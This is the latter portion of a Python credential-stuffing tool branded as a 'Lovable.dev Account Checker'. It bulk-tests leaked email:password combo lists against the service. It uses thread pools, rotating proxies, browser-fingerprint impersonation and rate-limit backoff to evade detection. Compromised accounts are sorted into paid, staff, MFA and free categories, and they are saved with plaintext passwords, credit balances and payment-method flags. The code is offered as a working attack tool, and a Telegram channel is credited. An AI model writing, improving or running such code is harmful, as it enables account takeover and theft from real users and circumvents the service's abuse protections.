        f"contract={_v(r.has_contract)}",
        f"sso={_v(r.has_sso)}",
        f"autotopup={_v(r.has_auto_topup)}",
        f"staff={_v(r.is_staff)}",
        f"outcloud={_v(r.out_of_cloud)}",
        f"outbuild={_v(r.out_of_build)}",
        f"outchat={_v(r.out_of_chat)}",
        f"frozen={_v(r.credits_frozen)}",
        f"providers={','.join(r.providers) if r.providers else '-'}",
    ]
    return " | ".join(parts) + f" | {LINE_TAG}"


def short_line(r, kind):
    cc = f"{r.email}:{r.password}"
    if kind == "paid":
        return (f"{cc} | paid | {plan_label(r.plan)} | "
                f"credits={r.credits} | user={r.username or '-'}")
    if kind == "paid_exhausted":
        return (f"{cc} | paid_exhausted | {plan_label(r.plan)} | "
                f"credits={r.credits}")
    if kind == "free":
        return (f"{cc} | free | {plan_label(r.plan)} | "
                f"credits={r.credits} | user={r.username or '-'}")
    if kind == "oauth":
        return f"{cc} | oauth | {r.reason or ','.join(r.providers) or '-'}"
    if kind == "mfa":
        kinds = ",".join(f["kind"] for f in r.mfa_factors) or "totp"
        return f"{cc} | mfa | {kinds} | uid={r.uid or '-'}"
    if kind == "staff":
        return f"{cc} | STAFF | {plan_label(r.plan)}"
    if kind == "exhausted":
        return f"{cc} | exhausted | credits={r.credits}"
    if kind == "bad":
        return f"{cc} | bad | {r.reason or 'wrong_creds'}"
    return f"{cc} | err | {readable_reason(r.reason)}"


def readable_reason(reason):
    if not reason:
        return "unknown"
    r = str(reason)
    if r == "net":
        return "network(error)"
    if r.startswith("net_"):
        return f"network({r[4:].lower()})"
    if r.startswith("fb_"):
        return f"firebase({r[3:].lower()})"
    if r.startswith("ws_"):
        return f"api({r[3:].lower()})"
    if r.startswith("pre_"):
        return f"precheck({r[4:].lower()})"
    return r


def mfa_line(r):
    factors = []
    for f in r.mfa_factors:
        if f.get("kind") == "phone" and f.get("phone"):
            factors.append(f"phone:{f['phone']}")
        else:
            factors.append(f.get("kind") or "totp")
    kind_str = ",".join(factors) if factors else "totp"
    return (f"{r.email}:{r.password} | mfa:{kind_str} | "
            f"uid={r.uid or '-'} | {LINE_TAG}")


def record(r):
    kind = classify(r)
    with _LK:
        _ST["checked"] += 1
        done = _ST["checked"]
        if kind in _ST:
            _ST[kind] += 1
        else:
            _ST["errors"] += 1
        total = _TOTAL

    sp = "\n\n" if _CFG.s.get("hit_spacer", True) else "\n"

    if kind == "mfa":
        rline(done, total, "mfa", short_line(r, kind))
        sw(_HANDLES["mfa"], mfa_line(r) + sp)
        return

    if kind in ("paid", "paid_exhausted", "free", "oauth", "staff", "exhausted"):
        line = fmt_line(r)
        rline(done, total, kind, short_line(r, kind))
        sw(_HANDLES[kind], line + sp)
        if kind in ("paid", "staff"):
            try:
                sw(_HANDLES["json"], json.dumps({
                    "email": r.email, "password": r.password,
                    "uid": r.uid, "username": r.username,
                    "display_name": r.display_name, "avatar": r.avatar,
                    "workspace_id": r.workspace_id,
                    "workspace_name": r.workspace_name,
                    "plan": r.plan, "plan_label": plan_label(r.plan),
                    "role": r.role, "joined": r.joined,
                    "credits": r.credits,
                    "credits_granted": r.credits_granted,
                    "daily_remaining": r.daily_remaining,
                    "daily_limit": r.daily_limit,
                    "cloud_remaining": r.cloud_remaining,
                    "ai_remaining": r.ai_remaining,
                    "connectors_remaining": r.connectors_remaining,
                    "chat_remaining": r.chat_remaining,
                    "chat_limit": r.chat_limit,
                    "num_projects": r.num_projects,
                    "referral_code": r.referral_code,
                    "referral_count": r.referral_count,
                    "monthly_usage": r.monthly_usage,
                    "builder_count": r.builder_count,
                    "has_invoice": r.has_invoice,
                    "has_payment_method": r.has_payment_method,
                    "has_contract": r.has_contract,
                    "has_sso": r.has_sso,
                    "has_auto_topup": r.has_auto_topup,
                    "is_staff": r.is_staff,
                    "out_of_cloud": r.out_of_cloud,
                    "out_of_build": r.out_of_build,
                    "out_of_chat": r.out_of_chat,
                    "credits_frozen": r.credits_frozen,
                    "kind": kind,
                }, ensure_ascii=False) + "\n")
            except Exception:
                pass
        return

    if kind == "bad":
        rline(done, total, "bad", short_line(r, kind))
        sw(_HANDLES["bad"],
           f"{r.email}:{r.password} | {r.reason or 'bad'} | {LINE_TAG}{sp}")
        return

    rline(done, total, "error", short_line(r, kind))
    sw(_HANDLES["error"],
       f"{r.email}:{r.password} | {readable_reason(r.reason)} | "
       f"{LINE_TAG}{sp}")


def run_one(combo):
    if _STOP.is_set():
        return
    gap = _CFG.s.get("combo_delay", 0.8)
    if gap > 0 and _STOP.wait(gap * (0.5 + random.random())):
        return
    rl_wait()
    if _STOP.is_set():
        return

    proxy = pick_proxy() if _POOL else None
    attempts = _CFG.s.get("retries", 2) + 1
    last = None

    try:
        for a in range(attempts):
            if _STOP.is_set():
                break
            if a > 0:
                rotate_fp()
                np = pick_proxy(exclude=proxy)
                if np:
                    if proxy and proxy != np:
                        rel_proxy(proxy)
                    proxy = np
            try:
                r = check_account(combo, proxy)
            except Exception as e:
                r = Result(combo.split(":", 1)[0], "")
                r.status = "error"
                r.reason = f"crash_{type(e).__name__}"

            last = r

            if r.status in ("hit", "bad", "oauth", "mfa", "exhausted"):
                break

            is_last = a == attempts - 1
            reason = r.reason or ""

            if reason == "rate_limit" \
                    or "too_many" in reason.lower() \
                    or reason in ("ws_429", "pre_429"):
                with _LK:
                    _ST["rl"] += 1
                if proxy:
                    cool_proxy(proxy, 300)
                rotate_fp()
                w = min(_CFG.s.get("rate_limit_delay", 60) * (2 ** a), 300)
                rl_backoff(w)
                if not proxy:
                    break
                if is_last:
                    break
                if _STOP.wait(w * (0.7 + random.random() * 0.6)):
                    break
                continue

            if reason == "net" \
                    or reason.startswith(("net_", "ws_", "pre_")) \
                    or reason in ("no_workspaces", "empty_workspaces"):
                if proxy:
                    bad_proxy(proxy)
                    cool_proxy(proxy, 30)
                if not is_last and _STOP.wait(1.0 + random.random()):
                    break
                continue

            break
    finally:
        if proxy:
            rel_proxy(proxy)

    if last is None:
        last = Result(combo.split(":", 1)[0], "")
        last.status = "error"
        last.reason = "no_result"

    try:
        record(last)
    except Exception:
        pass


def bulk_run(combos):
    global _TOTAL, _HANDLES
    reset_stats()
    _TOTAL = len(combos)

    d = folder()
    _HANDLES = open_files(d)

    threads = _CFG.s["threads"]
    log("🚀", "INFO", "START", f"{_TOTAL} combos · {threads} threads")

    _STOP.clear()
    ex = ThreadPoolExecutor(max_workers=threads)
    try:
        cap = max(threads * 4, 100)
        inflight = set()
        for i in range(0, len(combos), cap):
            if _STOP.is_set():
                break
            for c in combos[i:i + cap]:
                if _STOP.is_set():
                    break
                inflight.add(ex.submit(run_one, c))
            while len(inflight) >= cap:
                done, inflight = wait(inflight, timeout=0.4,
                                      return_when=FIRST_COMPLETED)
                for f in done:
                    try:
                        f.result(timeout=0.01)
                    except Exception:
                        pass
        while inflight:
            done, inflight = wait(inflight, timeout=0.4,
                                  return_when=FIRST_COMPLETED)
            for f in done:
                try:
                    f.result(timeout=0.01)
                except Exception:
                    pass
    except KeyboardInterrupt:
        _STOP.set()
    finally:
        _STOP.set()
        try:
            ex.shutdown(wait=True, cancel_futures=True)
        except TypeError:
            ex.shutdown(wait=True)

    for fh in _HANDLES.values():
        try:
            fh.close()
        except Exception:
            pass

    with _LK:
        snap = dict(_ST)

    for base, key in (
        ("lovable_paid.txt", "paid"),
        ("lovable_paid_exhausted.txt", "paid_exhausted"),
        ("lovable_free.txt", "free"),
        ("lovable_oauth_only.txt", "oauth"),
        ("lovable_mfa.txt", "mfa"),
        ("lovable_staff.txt", "staff"),
        ("lovable_exhausted.txt", "exhausted"),
        ("lovable_bad.txt", "bad"),
        ("lovable_errors.txt", "errors"),
    ):
        old = os.path.join(d, base)
        new = os.path.join(d, base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    el = time.time() - _START
    summary([
        ("Total", _TOTAL),
        ("PAID", snap["paid"]),
        ("PAID_EXHAUSTED", snap["paid_exhausted"]),
        ("FREE", snap["free"]),
        ("OAuth-only", snap["oauth"]),
        ("MFA", snap["mfa"]),
        ("STAFF", snap["staff"]),
        ("Exhausted", snap["exhausted"]),
        ("Bad creds", snap["bad"]),
        ("Errors", snap["errors"]),
        ("Rate limited", snap["rl"]),
        ("Proxy fails", snap["pfails"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{_TOTAL / max(el, 0.001):.2f} combo/s"),
        ("Folder", d),
        ("Credit", f"eyelifter · {TG_USER} · {TG_CHAN}"),
    ])


_COMBO_RX = re.compile(
    r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}):([^\s|,;>"\']+)'
)


def extract_combos(content):
    out = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        for m in _COMBO_RX.finditer(line):
            email = m.group(1).lower()
            pw = m.group(2)
            if not pw or len(pw) > 200:
                continue
            if pw.startswith(("http://", "https://")):
                continue
            out.add(f"{email}:{pw}")
    return sorted(out)


def ask_threads():
    section("THREADS")
    print(f"  current : {_CFG.s['threads']}")
    print(f"  range   : 1-{MAX_THREADS}")
    print("  blank to keep current")
    raw = input(f"{color('96', '[*] threads > ')}").strip()
    if not raw:
        return _CFG.s["threads"]
    try:
        t = max(1, min(MAX_THREADS, int(raw)))
    except ValueError:
        return _CFG.s["threads"]
    if t != _CFG.s["threads"]:
        _CFG.s["threads"] = t
        try:
            _CFG.save()
        except Exception:
            pass
    return t


def single_check(proxies):
    global _POOL, _BADP
    _STOP.clear()
    section("SINGLE CHECK")
    combo = input(f"{color('96', '[*] email:password > ')}").strip()
    if ":" not in combo:
        log("✗", "ERROR", "INPUT", "invalid")
        return

    proxy = None
    if proxies:
        if not _POOL:
            _POOL = list(proxies)
            _BADP = set()
        proxy = pick_proxy()

    log("🔍", "STEP", "CHECK", combo.split(":")[0])
    t0 = time.time()
    try:
        r = check_account(combo, proxy)
    except Exception as e:
        log("✗", "ERROR", "CHECK", str(e)[:80])
        return
    el = time.time() - t0

    kind = classify(r)
    section("RESULT")
    code, bold = _KIND_COLOR.get(kind, ("0", False))
    print(f"  {color(code, kind.upper(), bold)}")
    rows = [
        ("Email", r.email),
        ("Password", r.password),
        ("UID", r.uid or "-"),
        ("Username", r.username or "-"),
        ("Display name", r.display_name or "-"),
        ("Workspace ID", r.workspace_id or "-"),
        ("Workspace name", r.workspace_name or "-"),
        ("Role", r.role or "-"),
        ("Plan", f"{plan_label(r.plan)} ({r.plan})" if r.plan else "-"),
        ("Joined", human_time(r.joined) or "-"),
        ("Credits", f"{r.credits}/{r.credits_granted}"
            if r.credits is not None else "-"),
        ("Daily", f"{r.daily_remaining}/{r.daily_limit}"
            if r.daily_limit is not None else "-"),
        ("Cloud", r.cloud_remaining),
        ("AI", r.ai_remaining),
        ("Connectors", r.connectors_remaining),
        ("Chat", f"{r.chat_remaining}/{r.chat_limit}"
            if r.chat_limit is not None else "-"),
        ("Projects", r.num_projects),
        ("Referrals", f"{r.referral_count} ({r.referral_code or '-'})"),
        ("Monthly usage", r.monthly_usage),
        ("Builder count", r.builder_count),
        ("Has invoice", r.has_invoice),
        ("Has card", r.has_payment_method),
        ("Has contract", r.has_contract),
        ("Has SSO", r.has_sso),
        ("Auto topup", r.has_auto_topup),
        ("Is staff", r.is_staff),
        ("Providers", ",".join(r.providers) if r.providers else "-"),
        ("Out cloud", r.out_of_cloud),
        ("Out build", r.out_of_build),
        ("Out chat", r.out_of_chat),
        ("Frozen", r.credits_frozen),
        ("Reason", readable_reason(r.reason) if r.reason else "-"),
        ("Time", f"{el:.2f}s"),
        ("Credit", f"eyelifter · {TG_USER} · {TG_CHAN}"),
    ]
    if r.status == "mfa":
        rows.insert(9, ("MFA", ", ".join(
            f"{f['kind']}({f.get('display') or '-'})"
            for f in r.mfa_factors) or "totp"))
    wk = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {color('96', str(k).ljust(wk))}  {v}")


def bulk_check(proxies):
    global _POOL, _BADP
    _STOP.clear()
    section("BULK CHECK")
    path = input(f"{color('96', '[*] combo file > ')}").strip()
    if not path or not os.path.isfile(path):
        log("✗", "ERROR", "FILE", "not found")
        return
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    combos = extract_combos(content)
    if not combos:
        log("✗", "ERROR", "EXTRACT", "no valid combos")
        return
    log("✓", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    ask_threads()

    if proxies:
        _POOL = list(proxies)
        _BADP = set()
        log("🌐", "INFO", "PROXY", f"{len(proxies)} loaded")
    else:
        _POOL = []
        _BADP = set()
        log("⚠️", "WARN", "PROXY", "direct")

    try:
        bulk_run(combos)
    except KeyboardInterrupt:
        _STOP.set()
        log("🛑", "WARN", "STOP", "stopping...")


def settings_menu():
    section("SETTINGS")
    s = _CFG.s
    print(f"  [1]  Threads:              {s['threads']} (1-{MAX_THREADS})")
    print(f"  [2]  Timeout:              {s['timeout']}s")
    print(f"  [3]  Retries:              {s['retries']}")
    print(f"  [4]  Combo Delay:          {s['combo_delay']}s")
    print(f"  [5]  Proxies File:         {s['proxies_file']}")
    print(f"  [6]  Rate-limit Delay:     {s['rate_limit_delay']}s")
    print(f"  [7]  Skip Proxy Test:      {s['skip_proxy_test']}")
    print(f"  [8]  Debug:                {s['debug']}")
    print(f"  [9]  Hit Spacer:           {s['hit_spacer']}")
    print(f"  [10] Deep Enrich:          {s['deep_enrich']}")
    print(f"  [11] Staff Probe:          {s['staff_probe']}")
    print(f"  [12] Impersonate:          {s['impersonate']}")
    print(f"  [13] FP Rotate:            {s['fp_rotate']}")
    print(f"  [14] FP Pool:              {s['fp_pool'] or 'auto'}")
    print(f"  [15] FP Jitter:            {s['fp_jitter']}")
    print(f"  [0]  Back")
    ch = input(f"{color('96', '[*] select > ')}").strip()
    changed = False
    try:
        if ch == "1":
            s["threads"] = max(1, min(MAX_THREADS, int(input("threads: "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("timeout: "))))
            changed = True
        elif ch == "3":
            s["retries"] = max(0, min(5, int(input("retries: "))))
            changed = True
        elif ch == "4":
            s["combo_delay"] = max(0.0, min(60.0, float(input("combo delay: "))))
            changed = True
        elif ch == "5":
            v = input("proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "6":
            s["rate_limit_delay"] = max(1, min(300, int(input("rate-limit delay: "))))
            changed = True
        elif ch == "7":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "8":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "9":
            s["hit_spacer"] = not s["hit_spacer"]
            changed = True
        elif ch == "10":
            s["deep_enrich"] = not s["deep_enrich"]
            changed = True
        elif ch == "11":
            s["staff_probe"] = not s["staff_probe"]
            changed = True
        elif ch == "12":
            v = input("impersonate: ").strip()
            if v:
                s["impersonate"] = v
                reset_fp_cycle()
                changed = True
        elif ch == "13":
            v = input("fp rotate (session/attempt/fixed): ").strip().lower()
            s["fp_rotate"] = v if v in ("session", "attempt", "fixed") else "session"
            reset_fp_cycle()
            changed = True
        elif ch == "14":
            s["fp_pool"] = input("fp pool (comma list): ").strip()
            reset_fp_cycle()
            changed = True
        elif ch == "15":
            s["fp_jitter"] = not s["fp_jitter"]
            reset_fp_cycle()
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        log("✗", "ERROR", "CONFIG", "invalid")
        return
    if changed:
        try:
            _CFG.save()
            log("💾", "INFO", "CONFIG", "saved")
        except Exception:
            log("⚠️", "WARN", "CONFIG", "save failed")


def open_channel():
    try:
        import subprocess, shutil
        for cmd in ("termux-open-url", "xdg-open", "open"):
            if shutil.which(cmd):
                subprocess.Popen(
                    [cmd, f"https://t.me/{TG_CHAN.lstrip('@')}"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL, start_new_session=True,
                    close_fds=True)
                return
        if os.name == "nt":
            os.startfile(f"https://t.me/{TG_CHAN.lstrip('@')}")
            return
        import webbrowser
        webbrowser.open(f"https://t.me/{TG_CHAN.lstrip('@')}")
    except Exception:
        pass


def main():
    verify("main")
    if _CFG.s.get("open_channel_on_launch", True):
        threading.Thread(target=open_channel, daemon=True).start()

    banner(TOOL, "Lovable.dev Account Checker")
    fp = pick_fp(peek=True)
    log("🧬", "INFO", "TLS",
        f"curl_cffi={'on' if _HAVE_CFFI else 'off'} · "
        f"impersonate={fp['imp']} · ua_pool={len(_fp_targets())} · "
        f"rotate={_CFG.s.get('fp_rotate')}"
        f"{' · jitter' if _CFG.s.get('fp_jitter') else ''}")
    log("📣", "INFO", "CREDIT", f"eyelifter · {TG_USER} · {TG_CHAN}")
    log("🐛", "INFO", "DEBUG", f"{'ON' if _CFG.s.get('debug') else 'OFF'}")
    log("📊", "INFO", "DEEP",
        f"{'on' if _CFG.s.get('deep_enrich') else 'off'} · "
        f"staff={'on' if _CFG.s.get('staff_probe') else 'off'}")

    proxy_file = os.path.join(
        os.path.dirname(CFG_PATH),
        _CFG.s.get("proxies_file", "proxies.txt"))
    proxies = load_proxies(proxy_file)
    if proxies and not _CFG.s.get("skip_proxy_test", False):
        proxies = filter_proxies(proxies)

    while True:
        verify("menu")
        section(f"MAIN MENU · {TG_USER} · {TG_CHAN}")
        if proxies:
            log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies")
        else:
            log("⚠️", "WARN", "PROXY", "direct")
        log("⚙️", "INFO", "THREADS", f"{_CFG.s['threads']}")
        print("[1] Single check")
        print("[2] Bulk check")
        print("[3] Settings")
        print("[4] Exit")
        ch = input(f"{color('93', '[*] select > ')}").strip()

        if ch == "1":
            single_check(proxies)
        elif ch == "2":
            _STOP.clear()
            bulk_check(proxies)
        elif ch == "3":
            settings_menu()
            proxies = load_proxies(proxy_file)
            if proxies and not _CFG.s.get("skip_proxy_test", False):
                proxies = filter_proxies(proxies)
        elif ch == "4":
            print("Exiting...")
            return
        else:
            log("✗", "ERROR", "INPUT", "invalid")


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
    except BaseException as _exc:
        import traceback
        traceback.print_exc()
        print(f"[FATAL] {type(_exc).__name__}: {_exc}")